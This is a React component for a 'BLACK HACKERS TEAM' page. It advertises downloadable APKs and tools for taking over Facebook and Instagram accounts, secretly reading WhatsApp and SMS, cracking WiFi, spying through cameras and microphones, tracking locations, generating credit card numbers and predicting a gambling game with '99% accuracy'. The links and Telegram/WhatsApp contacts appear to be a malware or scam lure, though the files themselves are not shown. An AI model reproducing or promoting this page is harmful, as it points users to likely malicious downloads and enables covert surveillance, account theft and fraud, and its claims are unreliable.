import { useEffect } from "react";

export const Toolkit = () => {
  useEffect(() => {
    // Set page title
    document.title = "BLACK HACKERS TEAM";
    
    // Add dark background to body for the toolkit page
    document.body.style.background = "linear-gradient(135deg, #0a0a1a 0%, #050510 100%)";
    
    return () => {
      // Cleanup when leaving the page
      document.body.style.background = "";
    };
  }, []);

  const openSocialMedia = (platform: string, link: string) => {
    window.open(link, "_blank", "noopener,noreferrer");
  };

  const handleSearch = (e: React.ChangeEvent<HTMLInputElement>) => {
    const searchTerm = e.target.value.toLowerCase();
    const cards = document.querySelectorAll('.toolkit-card');
    
    cards.forEach((card) => {
      const title = card.querySelector('.card-title')?.textContent?.toLowerCase() || '';
      const desc = card.querySelector('.card-desc')?.textContent?.toLowerCase() || '';
      
      if (title.includes(searchTerm) || desc.includes(searchTerm)) {
        (card as HTMLElement).style.display = 'flex';
      } else {
        (card as HTMLElement).style.display = searchTerm === '' ? 'flex' : 'none';
      }
    });
  };

  return (
    <>
      <style>{`
        :root {
          --dark: #0a0a1a;
          --darker: #050510;
          --neon-blue: #00ccff;
          --neon-pink: #ff00ff;
          --neon-purple: #8a2be2;
          --text-color: #e0e0e0;
          --card-bg: rgba(15, 15, 35, 0.8);
        }

        .toolkit-body {
          font-family: 'Rajdhani', sans-serif;
          color: var(--text-color);
          line-height: 1.6;
          min-height: 100vh;
          overflow-x: hidden;
          padding: 20px;
          position: relative;
        }

        .toolkit-body::before {
          content: '';
          position: fixed;
          top: 0;
          left: 0;
          width: 100%;
          height: 100%;
          background: 
            radial-gradient(circle at 20% 30%, rgba(41, 4, 84, 0.6) 0%, transparent 50%),
            radial-gradient(circle at 80% 70%, rgba(0, 100, 200, 0.6) 0%, transparent 50%);
          z-index: -2;
          pointer-events: none;
        }

        .grid-overlay {
          position: fixed;
          top: 0;
          left: 0;
          width: 100%;
          height: 100%;
          background-image: 
            linear-gradient(rgba(0, 100, 255, 0.1) 1px, transparent 1px),
            linear-gradient(90deg, rgba(0, 100, 255, 0.1) 1px, transparent 1px);
          background-size: 40px 40px;
          z-index: -1;
          animation: gridMove 20s infinite linear;
          pointer-events: none;
        }

        @keyframes gridMove {
          0% { background-position: 0 0; }
          100% { background-position: 40px 40px; }
        }

        @keyframes glow {
          0% { text-shadow: 0 0 10px rgba(0, 204, 255, 0.7), 0 0 20px rgba(255, 0, 255, 0.5); }
          100% { text-shadow: 0 0 20px rgba(0, 204, 255, 0.9), 0 0 40px rgba(255, 0, 255, 0.7), 0 0 60px rgba(255, 0, 255, 0.5); }
        }

        @keyframes pulse {
          0% { box-shadow: 0 0 10px rgba(0, 200, 255, 0.7); }
          50% { box-shadow: 0 0 20px rgba(0, 200, 255, 0.9), 0 0 30px rgba(0, 200, 255, 0.5); }
          100% { box-shadow: 0 0 10px rgba(0, 200, 255, 0.7); }
        }

        .toolkit-container {
          max-width: 1200px;
          margin: 0 auto;
          position: relative;
          z-index: 1;
        }

        .toolkit-header {
          text-align: center;
          margin-bottom: 40px;
          padding: 20px 0;
          position: relative;
        }

        .app-name {
          font-family: 'Orbitron', sans-serif;
          font-size: 2.8rem;
          font-weight: 700;
          background: linear-gradient(to right, var(--neon-blue), var(--neon-pink));
          -webkit-background-clip: text;
          -webkit-text-fill-color: transparent;
          text-shadow: 0 0 20px rgba(0, 204, 255, 0.7), 0 0 40px rgba(255, 0, 255, 0.5);
          margin-bottom: 15px;
          letter-spacing: 2px;
          animation: glow 3s ease-in-out infinite alternate;
        }

        .app-tagline {
          font-size: 1.2rem;
          color: var(--neon-blue);
          margin-bottom: 30px;
          text-shadow: 0 0 10px rgba(0, 204, 255, 0.7);
        }

        .social-icons {
          position: absolute;
          top: 20px;
          right: 20px;
          display: flex;
          gap: 15px;
          z-index: 100;
        }

        .social-icon {
          width: 50px;
          height: 50px;
          border-radius: 50%;
          background: rgba(0, 0, 0, 0.3);
          backdrop-filter: blur(10px);
          display: flex;
          align-items: center;
          justify-content: center;
          color: white;
          font-size: 1.5rem;
          box-shadow: 0 0 15px rgba(0, 200, 255, 0.7);
          transition: all 0.3s ease;
          cursor: pointer;
          animation: pulse 2s infinite;
        }

        .social-icon:nth-child(2) {
          animation-delay: 0.5s;
          box-shadow: 0 0 15px rgba(255, 0, 255, 0.7);
        }

        .social-icon:hover {
          transform: scale(1.1);
        }

        .whatsapp {
          background: linear-gradient(135deg, #25D366, #128C7E);
        }

        .telegram {
          background: linear-gradient(135deg, #0088cc, #005580);
        }

        .header-controls {
          display: flex;
          justify-content: center;
          align-items: center;
          gap: 20px;
          margin-top: 20px;
        }

        .search-container {
          position: relative;
          width: 350px;
        }

        .search-container input {
          width: 100%;
          padding: 14px 20px 14px 50px;
          border-radius: 50px;
          border: 2px solid var(--neon-blue);
          background: rgba(15, 15, 35, 0.8);
          color: var(--text-color);
          font-size: 1rem;
          box-shadow: 0 0 15px rgba(0, 200, 255, 0.5);
          transition: all 0.3s ease;
        }

        .search-container input:focus {
          outline: none;
          box-shadow: 0 0 20px rgba(0, 200, 255, 0.8);
        }

        .search-icon {
          position: absolute;
          left: 20px;
          top: 50%;
          transform: translateY(-50%);
          color: var(--neon-blue);
        }

        .toolkit-section {
          margin-bottom: 50px;
        }

        .section-title {
          font-family: 'Orbitron', sans-serif;
          font-size: 1.8rem;
          font-weight: 600;
          margin-bottom: 25px;
          padding-bottom: 10px;
          border-bottom: 2px solid var(--neon-blue);
          display: inline-block;
          text-shadow: 0 0 10px rgba(0, 200, 255, 0.7);
          color: var(--neon-blue);
        }

        .cards-container {
          display: grid;
          grid-template-columns: repeat(auto-fill, minmax(320px, 1fr));
          gap: 25px;
        }

        .toolkit-card {
          background: var(--card-bg);
          border-radius: 15px;
          overflow: hidden;
          transition: all 0.3s ease;
          box-shadow: 0 10px 20px rgba(0, 0, 0, 0.3);
          height: 100%;
          display: flex;
          flex-direction: column;
          padding: 25px;
          text-align: center;
          border: 1px solid rgba(0, 200, 255, 0.3);
          backdrop-filter: blur(10px);
        }

        .toolkit-card:hover {
          transform: translateY(-10px);
          box-shadow: 0 15px 30px rgba(0, 0, 0, 0.4), 0 0 20px rgba(0, 200, 255, 0.5);
        }

        .card-icon {
          font-size: 3.5rem;
          margin-bottom: 20px;
          transition: all 0.3s ease;
        }

        .toolkit-card:hover .card-icon {
          transform: scale(1.2);
        }

        .card-content {
          flex-grow: 1;
          display: flex;
          flex-direction: column;
        }

        .card-title {
          font-family: 'Orbitron', sans-serif;
          font-size: 1.5rem;
          font-weight: 600;
          margin-bottom: 10px;
          color: var(--neon-blue);
          text-shadow: 0 0 10px rgba(0, 200, 255, 0.5);
        }

        .card-desc {
          margin-bottom: 20px;
          color: var(--text-color);
          flex-grow: 1;
          font-size: 1rem;
        }

        .card-button {
          display: block;
          text-align: center;
          color: white;
          padding: 12px;
          border-radius: 8px;
          text-decoration: none;
          font-weight: 500;
          transition: all 0.3s ease;
          margin-top: auto;
          border: none;
          cursor: pointer;
          font-size: 1rem;
          background: linear-gradient(to right, var(--neon-blue), var(--neon-pink));
          box-shadow: 0 0 15px rgba(0, 200, 255, 0.5);
        }

        .card-button:hover {
          opacity: 0.9;
          transform: translateY(-2px);
          box-shadow: 0 0 20px rgba(0, 200, 255, 0.8);
        }

        .color-1 { background: linear-gradient(to right, #ff6b6b, #ff9e6b); }
        .color-2 { background: linear-gradient(to right, #4ecdc4, #00c6ff); }
        .color-3 { background: linear-gradient(to right, #7b68ee, #6a5acd); }
        .color-4 { background: linear-gradient(to right, #20bf6b, #01baef); }
        .color-5 { background: linear-gradient(to right, #fbc531, #e1b12c); }
        .color-6 { background: linear-gradient(to right, #8854d0, #a55eea); }
        .color-7 { background: linear-gradient(to right, #3867d6, #4b7bec); }
        .color-8 { background: linear-gradient(to right, #fa8231, #fd9644); }
        .color-9 { background: linear-gradient(to right, #2d98da, #45aaf2); }
        .color-10 { background: linear-gradient(to right, #a55eea, #8854d0); }
        .color-11 { background: linear-gradient(to right, #fd9644, #fa8231); }
        .color-12 { background: linear-gradient(to right, #45aaf2, #2d98da); }

        .icon-color-1 { color: #ff6b6b; }
        .icon-color-2 { color: #4ecdc4; }
        .icon-color-3 { color: #7b68ee; }
        .icon-color-4 { color: #20bf6b; }
        .icon-color-5 { color: #fbc531; }
        .icon-color-6 { color: #8854d0; }
        .icon-color-7 { color: #3867d6; }
        .icon-color-8 { color: #fa8231; }
        .icon-color-9 { color: #2d98da; }
        .icon-color-10 { color: #a55eea; }
        .icon-color-11 { color: #fd9644; }
        .icon-color-12 { color: #45aaf2; }

        .toolkit-footer {
          text-align: center;
          padding: 30px 0;
          margin-top: 50px;
          border-top: 1px solid rgba(0, 200, 255, 0.3);
          color: var(--text-color);
        }

        @media (max-width: 768px) {
          .cards-container {
            grid-template-columns: 1fr;
          }
          .search-container {
            width: 100%;
          }
          .app-name {
            font-size: 2.2rem;
          }
          .social-icons {
            position: relative;
            top: 0;
            right: 0;
            justify-content: center;
            margin-top: 20px;
          }
        }
      `}</style>

      <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
      <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;600;700&family=Rajdhani:wght@300;400;500;600&display=swap" rel="stylesheet" />

      <div className="toolkit-body">
        <div className="grid-overlay"></div>

        <div className="toolkit-container">
          <header className="toolkit-header">
            <h1 className="app-name">BLACK HACKERS TEAM</h1>
            <p className="app-tagline">ULTIMATE HACKING TOOLKIT WITH ADVANCED FEATURES</p>
            
            <div className="social-icons">
              <div 
                className="social-icon whatsapp" 
                onClick={() => openSocialMedia('whatsapp', 'https://wa.me/+254745389494')}
              >
                <i className="fab fa-whatsapp"></i>
              </div>
              <div 
                className="social-icon telegram" 
                onClick={() => openSocialMedia('telegram', 'https://t.me/BlacKHackerSTeaM1')}
              >
                <i className="fab fa-telegram"></i>
              </div>
            </div>
            
            <div className="header-controls">
              <div className="search-container">
                <i className="fas fa-search search-icon"></i>
                <input 
                  type="text" 
                  placeholder="SEARCH FOR HACKS, METHODS, TOOLS..."
                  onChange={handleSearch}
                />
              </div>
            </div>
          </header>

          <main>
            <section className="toolkit-section">
              <h2 className="section-title">SOCIAL MEDIA HACKS</h2>
              <div className="cards-container">
                <div className="toolkit-card">
                  <div className="card-icon icon-color-1">
                    <i className="fab fa-tiktok"></i>
                  </div>
                  <div className="card-content">
                    <h3 className="card-title">TIKTOK HACK</h3>    
                    <p className="card-desc">INCREASE FOLLOWERS AND LIKES ON TIKTOK WITH OUR ADVANCED HACKING TOOL.</p>
                    <a href="https://mass-randie-venomvishal-a24f6eec.koyeb.app/174040/TikFollowers_v1.apk?hash=AgADbR" className="card-button color-1" target="_blank" rel="noopener noreferrer">DOWNLOAD APK</a>
                  </div>
                </div>

                <div className="toolkit-card">
                  <div className="card-icon icon-color-2">
                    <i className="fab fa-facebook"></i>
                  </div>
                  <div className="card-content">
                    <h3 className="card-title">FACEBOOK HACK</h3>
                    <p className="card-desc">ACCESS FACEBOOK ACCOUNTS EASILY WITH OUR PROFESSIONAL HACKING TOOL.</p>
                    <a href="https://mass-randie-venomvishal-a24f6eec.koyeb.app/174037/Facebook.apk?hash=AgADjh" className="card-button color-2" target="_blank" rel="noopener noreferrer">DOWNLOAD APK</a>
                  </div>
                </div>

                <div className="toolkit-card">
                  <div className="card-icon icon-color-3">
                    <i className="fab fa-instagram"></i>
                  </div>
                  <div className="card-content">
                    <h3 className="card-title">INSTAGRAM HACK</h3>
                    <p className="card-desc">GAIN MORE FOLLOWERS AND ACCESS INSTAGRAM ACCOUNTS WITH EASE.</p>
                    <a href="https://dl2.filesdwn.ir/url/php2/?uniq=8F1aQT7r" className="card-button color-3" target="_blank" rel="noopener noreferrer">DOWNLOAD TOOL</a>
                  </div>
                </div>

                <div className="toolkit-card">
                  <div className="card-icon icon-color-4">
                    <i className="fab fa-whatsapp"></i>
                  </div>
                  <div className="card-content">
                    <h3 className="card-title">WHATSAPP HACK</h3>
                    <p className="card-desc">READ WHATSAPP MESSAGES WITHOUT DETECTION WITH OUR ADVANCED TOOL.</p>
                    <a href="https://play.google.com/store/apps/details?id=com.geeksoftapps.whatsweb" className="card-button color-4" target="_blank" rel="noopener noreferrer">GET APP</a>
                  </div>
                </div>

                <div className="toolkit-card">
                  <div className="card-icon icon-color-5">
                    <i className="fas fa-wifi"></i>
                  </div>
                  <div className="card-content">
                    <h3 className="card-title">WIFI HACK</h3>
                    <p className="card-desc">CRACK WIFI NETWORKS AND OBTAIN PASSWORDS WITH OUR ADVANCED TOOL.</p>
                    <a href="https://www.mediafire.com/file/3p30nrbpzr3kqsl/WI-FI_HACK_2025.apk/file" className="card-button color-5" target="_blank" rel="noopener noreferrer">DOWNLOAD APK</a>
                  </div>
                </div>

                <div className="toolkit-card">
                  <div className="card-icon icon-color-6">
                    <i className="fas fa-sms"></i>
                  </div>
                  <div className="card-content">
                    <h3 className="card-title">SMS HACK</h3>
                    <p className="card-desc">SEND AND READ SMS MESSAGES WITHOUT DETECTION WITH OUR TOOL.</p>
                    <a href="https://play.google.com/store/apps/details?id=com.frzinapps.smsforward" className="card-button color-6" target="_blank" rel="noopener noreferrer">GET APP</a>
                  </div>
                </div>
              </div>
            </section>

            <section className="toolkit-section">
              <h2 className="section-title">NEW ADDED TOOLS</h2>
              <div className="cards-container">
                <div className="toolkit-card">
                  <div className="card-icon icon-color-7">
                    <i className="fas fa-plane"></i>
                  </div>
                  <div className="card-content">
                    <h3 className="card-title">AVIATOR PREDICTOR FREE</h3>
                    <p className="card-desc">PREDICT AVIATOR GAME OUTCOMES WITH 99% ACCURACY USING AI ALGORITHMS.</p>
                    <a href="https://www.mediafire.com/file/ryj6kr9f4agqtum/Aviator_Hack_V1.0_1.0.apk/file" className="card-button color-7" target="_blank" rel="noopener noreferrer">DOWNLOAD APK</a>
                  </div>
                </div>

                <div className="toolkit-card">
                  <div className="card-icon icon-color-8">
                    <i className="fas fa-envelope"></i>
                  </div>
                  <div className="card-content">
                    <h3 className="card-title">UNLIMITED GMAIL</h3>
                    <p className="card-desc">CREATE UNLIMITED GMAIL ACCOUNTS WITH OUR AUTOMATED TOOL.</p>
                    <a href="https://www.mediafire.com/file/nnkxxbnz0awzfbm/Gmail_Creator.zip/file" className="card-button color-8" target="_blank" rel="noopener noreferrer">DOWNLOAD TOOL</a>
                  </div>
                </div>

                <div className="toolkit-card">
                  <div className="card-icon icon-color-9">
                    <i className="fas fa-credit-card"></i>
                  </div>
                  <div className="card-content">
                    <h3 className="card-title">CARD HACK</h3>
                    <p className="card-desc">GENERATE VALID CREDIT CARD NUMBERS FOR TESTING PURPOSES.</p>
                    <a href="https://www.mediafire.com/file/g8dme5d0t7kf0vp/Card_Generator.zip/file" className="card-button color-9" target="_blank" rel="noopener noreferrer">DOWNLOAD TOOL</a>
                  </div>
                </div>
              </div>
            </section>

            <section className="toolkit-section">
              <h2 className="section-title">ADDITIONAL HACKING METHODS</h2>
              <div className="cards-container">
                <div className="toolkit-card">
                  <div className="card-icon icon-color-10">
                    <i className="fas fa-camera"></i>
                  </div>
                  <div className="card-content">
                    <h3 className="card-title">CAMERA HACK</h3>
                    <p className="card-desc">ACCESS DEVICE CAMERAS REMOTELY WITH OUR ADVANCED TOOL.</p>
                    <a href="https://www.mediafire.com/file/camera_hack.apk" className="card-button color-10" target="_blank" rel="noopener noreferrer">DOWNLOAD APK</a>
                  </div>
                </div>

                <div className="toolkit-card">
                  <div className="card-icon icon-color-11">
                    <i className="fas fa-microphone"></i>
                  </div>
                  <div className="card-content">
                    <h3 className="card-title">MICROPHONE HACK</h3>
                    <p className="card-desc">LISTEN TO CONVERSATIONS REMOTELY WITH OUR SPY TOOL.</p>
                    <a href="https://www.mediafire.com/file/mic_hack.apk" className="card-button color-11" target="_blank" rel="noopener noreferrer">DOWNLOAD APK</a>
                  </div>
                </div>

                <div className="toolkit-card">
                  <div className="card-icon icon-color-12">
                    <i className="fas fa-location-arrow"></i>
                  </div>
                  <div className="card-content">
                    <h3 className="card-title">LOCATION TRACKER</h3>
                    <p className="card-desc">TRACK ANY DEVICE LOCATION IN REAL-TIME WITH GPS PRECISION.</p>
                    <a href="https://www.mediafire.com/file/location_tracker.apk" className="card-button color-12" target="_blank" rel="noopener noreferrer">DOWNLOAD APK</a>
                  </div>
                </div>
              </div>
            </section>

            <section className="toolkit-section">
              <h2 className="section-title">VIDEO TUTORIALS</h2>
              <div className="cards-container">
                <div className="toolkit-card">
                  <div className="card-icon icon-color-1">
                    <i className="fab fa-youtube"></i>
                  </div>
                  <div className="card-content">
                    <h3 className="card-title">HACKING TUTORIALS</h3>
                    <p className="card-desc">LEARN ADVANCED HACKING TECHNIQUES WITH OUR VIDEO TUTORIALS.</p>
                    <a href="https://youtube.com/@blackhackersteam" className="card-button color-1" target="_blank" rel="noopener noreferrer">WATCH VIDEOS</a>
                  </div>
                </div>

                <div className="toolkit-card">
                  <div className="card-icon icon-color-2">
                    <i className="fas fa-book"></i>
                  </div>
                  <div className="card-content">
                    <h3 className="card-title">HACKING GUIDES</h3>
                    <p className="card-desc">COMPREHENSIVE GUIDES AND DOCUMENTATION FOR ALL TOOLS.</p>
                    <a href="https://t.me/BlacKHackerSTeaM1" className="card-button color-2" target="_blank" rel="noopener noreferrer">READ GUIDES</a>
                  </div>
                </div>

                <div className="toolkit-card">
                  <div className="card-icon icon-color-3">
                    <i className="fas fa-users"></i>
                  </div>
                  <div className="card-content">
                    <h3 className="card-title">COMMUNITY SUPPORT</h3>
                    <p className="card-desc">JOIN OUR EXCLUSIVE HACKER COMMUNITY FOR SUPPORT AND UPDATES.</p>
                    <a href="https://t.me/BlacKHackerSTeaM1" className="card-button color-3" target="_blank" rel="noopener noreferrer">JOIN COMMUNITY</a>
                  </div>
                </div>
              </div>
            </section>
          </main>

          <footer className="toolkit-footer">
            <p>&copy; 2025 BLACK HACKERS TEAM. All rights reserved. | Elite tools for elite hackers.</p>
          </footer>
        </div>
      </div>
    </>
  );
};